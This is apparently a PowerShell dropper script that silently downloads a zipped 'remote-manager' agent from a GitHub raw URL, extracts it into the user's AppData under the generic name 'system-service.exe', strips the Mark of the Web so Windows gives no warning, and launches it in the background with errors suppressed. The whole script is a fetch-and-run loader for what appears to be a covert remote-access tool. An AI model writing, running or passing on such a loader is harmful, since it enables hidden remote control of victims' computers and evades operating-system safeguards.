$ErrorActionPreference = 'SilentlyContinue'
$targetDir = "$env:APPDATA\SystemService"
$targetExe = "$targetDir\system-service.exe"
$tempZip   = "$env:TEMP\system-service.zip"

# Ensure target directory exists
New-Item -ItemType Directory -Path $targetDir -Force | Out-Null

# Stop any running agent (current or legacy) so the executable can be replaced.
# The new build also terminates old installs on launch.
Get-Process -Name "system-service", "remote-manager-agent" -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep -Milliseconds 800

# Download high-speed lightweight zip archive (~2.9 MB instead of 7.2 MB)
$url = "https://raw.githubusercontent.com/satyamkumar420/apps-vault/master/remote-manager/windows/system-service-windows-silent.exe.zip"
Invoke-WebRequest -Uri $url -OutFile $tempZip -UseBasicParsing

# Extract silently directly to target directory
if (Test-Path $tempZip) {
    # Unblock the zip itself before extracting to prevent inherited Mark of the Web
    Unblock-File -Path $tempZip
    
    # Use built-in .NET ZipFile for ultra-fast extraction
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [System.IO.Compression.ZipFile]::ExtractToDirectory($tempZip, $targetDir)
    
    # Clean up temporary zip
    Remove-Item -Path $tempZip -Force
}

# Fallback: if extracted as the original filename, rename/ensure system-service.exe
$extracted = Join-Path $targetDir "system-service-windows-silent.exe"
if (Test-Path $extracted) {
    Move-Item -Path $extracted -Destination $targetExe -Force
}

# Permanently strip NTFS Mark of the Web from binary
if (Test-Path $targetExe) {
    Unblock-File -Path $targetExe
    # Launch completely silent in the background
    Start-Process -FilePath $targetExe
}
